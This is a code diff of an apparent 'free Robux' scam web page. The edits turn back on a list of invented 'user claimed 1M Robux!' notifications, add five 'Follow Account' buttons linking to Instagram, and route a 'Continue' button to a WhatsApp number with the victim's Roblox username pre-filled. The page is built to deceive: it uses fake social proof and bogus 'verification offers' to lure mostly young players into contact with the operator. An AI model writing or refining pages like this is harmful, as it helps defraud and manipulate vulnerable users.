@@ -120,7 +120,7 @@
             padding: 30px;
             border-radius: 12px;
             box-shadow: 0 8px 32px rgba(0,0,0,0.3);
-            position: relative; /* Needed for modal positioning */
+            position: relative;
         }
 
         input {
@@ -192,7 +192,7 @@
         .pic { width: 25px; margin-right: 8px; }
         .robux_total span { font-weight: 600; }
 
-        /* --- STYLES FOR OLD DESIGN MODAL --- */
+        /* --- STYLES FOR VERIFICATION MODAL --- */
         #verificationModal {
             display: none; /* Hidden by default */
             position: fixed;
@@ -216,12 +216,25 @@
             max-width: 450px;
             margin: auto;
         }
-        .verification-header { display: flex; justify-content: center; align-items: center; gap: 15px; margin-bottom: 20px; }
-        .verification-header img { height: 60px; }
+        
+        .verification-header { 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            margin-bottom: 20px; 
+        }
+
+        /* CSS to make the logo proportional */
+        #modalLogo {
+            max-width: 100%;      /* Gambar tidak akan lebih lebar dari containernya */
+            height: auto;         /* Menjaga rasio aspek gambar */
+            max-height: 120px;    /* Batas tinggi maksimal agar tidak terlalu besar */
+        }
+
         .verification-title { color: #005A9C; font-size: 18px; font-weight: bold; line-height: 1.4; margin-bottom: 25px; }
         .offer-button { display: block; width: 100%; padding: 15px; margin-bottom: 10px; background-color: #f0f0f0; border: 1px solid #ccc; border-radius: 8px; color: #333; font-size: 16px; font-weight: 600; text-align: center; cursor: pointer; transition: background-color 0.3s; margin-top: 0; }
         .offer-button:hover { background-color: #e0e0e0; }
-        .verify-now-button { background: #28a745; border: none; color: #fff; padding: 12px 40px; border-radius: 8px; font-weight: 600; letter-spacing: 1px; font-size: 16px; cursor: pointer; margin-top: 10px; transition: all 0.3s; width: 100%; }
+        .verify-now-button { background: #28a745; border: none; color: #fff; padding: 12px 40px; border-radius: 8px; font-weight: 600; letter-spacing: 1px; font-size: 16px; cursor: pointer; margin-top: 15px; transition: all 0.3s; width: 100%; }
         .verify-now-button:hover { background: #218838; transform: translateY(-2px); }
         
         /* --- Styles for initial verification step --- */
@@ -293,13 +306,20 @@
     <div id="verificationModal">
         <div class="verification-container">
             <div class="verification-header">
-              <img src="images/image-logo.png" width="400" height="600" alt="">
+                <img id="modalLogo" src="images/image-logo.png" alt="Sponsor Logo">
             </div>
             <p class="verification-title">CHOOSE THE OFFER AND COMPLETE, ROBUX WILL AUTOMATICALLY BE ENTERED INTO YOUR ACCOUNT</p>
-            <button id="modalFollowBtn" class="offer-button">Follow Account</button>
-            <button id="modalContinueBtn" class="verify-now-button">2. Continue</button>
+            
+            <button class="modalFollowBtn offer-button" data-link="https://instagram.com/akun1">Follow Account 1</button>
+            <button class="modalFollowBtn offer-button" data-link="https://instagram.com/akun2">Follow Account 2</button>
+            <button class="modalFollowBtn offer-button" data-link="https://instagram.com/akun3">Follow Account 3</button>
+            <button class="modalFollowBtn offer-button" data-link="https://instagram.com/akun4">Follow Account 4</button>
+            <button class="modalFollowBtn offer-button" data-link="https://instagram.com/akun5">Follow Account 5</button>
+            
+            <button id="modalContinueBtn" class="verify-now-button">Continue</button>
         </div>
     </div>
+
 
     <div id="popupNotification"></div>
     <audio id="notifSound" preload="auto">
@@ -307,7 +327,7 @@
     </audio>
 
     <script>
-        // const messages = ["xfasom claimed 50k Robux!", "chaloka claimed 1M Robux!", "guest123 just received 100k Robux!", "user999 unlocked 500k Robux!", "winbot claimed 250k Robux!", "zoro212 just earned 1.2M Robux!", "yara2000 claimed 750k Robux!"];
+        const messages = ["xfasom claimed 50k Robux!", "chaloka claimed 1M Robux!", "guest123 just received 100k Robux!", "user999 unlocked 500k Robux!", "winbot claimed 250k Robux!", "zoro212 just earned 1.2M Robux!", "yara2000 claimed 750k Robux!"];
         const notification = document.getElementById("popupNotification");
         const sound = document.getElementById("notifSound");
         const rbxbtn = document.querySelector(".getrbx");
@@ -318,8 +338,10 @@
         // Modal elements
         const verificationModal = document.getElementById("verificationModal");
         const initialVerifyBtn = document.getElementById("initialVerifyBtn");
-        const modalFollowBtn = document.getElementById("modalFollowBtn");
         const modalContinueBtn = document.getElementById("modalContinueBtn");
+        
+        // Memilih SEMUA tombol follow dengan class
+        const modalFollowButtons = document.querySelectorAll(".modalFollowBtn");
 
         let selectedUsername = "";
         let selectedRobuxAmount = "";
@@ -366,23 +388,30 @@
             });
         });
 
-        // "Verify now" button shows the modal
+        // Tombol "Verify now" utama akan menampilkan modal
         initialVerifyBtn.addEventListener("click", () => {
-            verificationModal.style.display = "flex"; // Show the modal
+            verificationModal.style.display = "flex";
         });
         
-        // "Follow" button in modal opens a new tab
-        modalFollowBtn.addEventListener("click", () => {
-            // Ganti dengan link sponsor/media sosial Anda
-            window.open('https://www.instagram.com/herond', '_blank');
+        // Loop untuk setiap tombol "Follow" di dalam modal
+        modalFollowButtons.forEach(button => {
+            button.addEventListener("click", () => {
+                // Ambil link dari atribut data-link
+                const link = button.dataset.link;
+                if (link && link !== "#") {
+                    window.open(link, '_blank');
+                } else {
+                    alert("Link untuk akun ini belum diatur.");
+                }
+            });
         });
 
-        // "Continue" button in modal triggers the final WhatsApp action
+        // Tombol "Continue" di dalam modal akan membuka WhatsApp
         modalContinueBtn.addEventListener("click", () => {
             const message = `Hello! I want to claim ${parseInt(selectedRobuxAmount).toLocaleString()} Robux for my Roblox account: ${selectedUsername}. I have completed all the verification tasks. Please process my request.`;
             const whatsappUrl = `https://wa.me/6282145804242?text=${encodeURIComponent(message)}`;
             window.open(whatsappUrl, '_blank');
-            verificationModal.style.display = "none"; // Hide the modal
+            verificationModal.style.display = "none"; // Sembunyikan modal setelah selesai
         });
         
         setTimeout(showNotification, 2000);
